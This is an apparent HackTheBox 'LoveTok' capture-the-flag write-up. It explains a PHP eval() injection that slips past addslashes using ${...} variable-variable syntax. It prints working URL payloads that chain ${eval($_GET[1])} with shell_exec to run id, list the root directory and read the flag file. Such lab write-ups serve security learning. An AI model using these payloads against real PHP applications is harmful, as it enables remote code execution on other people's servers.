---
title: "LoveTok Writeup"
date: 2023-05-04T09:33:18-04:00
draft: false
images:
tags:
  - hackthebox
  - linux
  - hacking
---

## Difficulty: Easy

You are greeted with the following web app:

![Untitled](../../img/LoveTok.png)

Looking at the source code for the app, the `eval` function being called in `TimeModel.php`:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

The inputs being put into the eval function are `$this->format` and `$this->prediction`. Looking at the constructor of this class, `$this->prediction` is not a user-controlled input and thus is of no interest to us. 

On the other hand, `$this->format` gets its value from an argument passed into the constructor. The argument `$format` is ran through the `addslashes` function which escapes any quotes present. This is an attempt at preventing Remote Code Execution in the `eval` function. 

Looking at `TimeController.php`, we can see where and how the `TimeModel` class is instantiated:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

Notice how that `$format` argument passed into the constructor of the `TimeModel` class is taken from the URL parameter `format`. Then on the return statement, the `getTime` method on the `TimeModel` class is called, which is where the `eval` function is used. 

Since the format is ran through `addslashes`, trying something like:

`http://challenge-address:port/?format='); echo shell_exec('id');` 

will NOT work. 

## Why `addslashes` Does Not Prevent Remote Code Execution:

In PHP, there is something called a “variable variable” (no, this is not a typo). It’s essentially a variable which holds the name of another variable. 

Example:

```php
$foo = 'bar'; // the variable "foo" holds the name of the variable "bar"
$bar = 'hello world';
```

Using variable variables, you can do the following in PHP:

```php
$foo = 'bar';
$bar = 'hello world';

echo ${$foo}; // outputs 'hello world'
```

The reason this outputs ‘hello world’ is because the value of `$foo` is `bar` which then gets “treated” as the name for a variable using the `${}` operator. So in the end, the program accesses the value for `$bar`.

Why is the useful? Well any code you write inside of the `${}` brackets will be executed. 

To test this, we try the following:

`http://challenge-address:port/?format=${phpinfo()}`

which returns the following:

![Untitled](../../img/LoveTok%20(1).png)

Meaning that the function `phpinfo` was successfully executed. Perfect!

The only problem we still have is that if we add any quotes, single or double, they will be escaped by the `addslashes` method. 

A smart workaround is the following:

```
http://challenge-address:port/?format=${eval($_GET[1])}&1=echo shell_exec('id');
```

Let’s break it down:

1. `${eval($_GET[1])}` will evaluate another URL parameter `1`. We chose a number instead of a word because we obviously can’t include quotes in the `format` URL parameter. 
2. `1=echo shell_exec('id');` is the URL parameter for `1` which contains PHP code that will be executed by the `format` URL parameter. This code just runs the `id` command on the system and prints out the output

It works!

![Untitled](../../img/LoveTok%20(2).png)

We can now use this to check the `/` directory for the flag’s filename:

```
http://challenge-address:port/?format=${eval($_GET[1])}&1=echo shell_exec('ls /');
```

![Untitled](../../img/LoveTok%20(3).png)

Now that we found the flag’s filename, we get its contents using the following: 

```
http://challenge-address:port/?format=${eval($_GET[1])}&1=echo shell_exec('cat /flagztFnn');
```

![Untitled](../../img/LoveTok%20(4).png)

We now have the flag!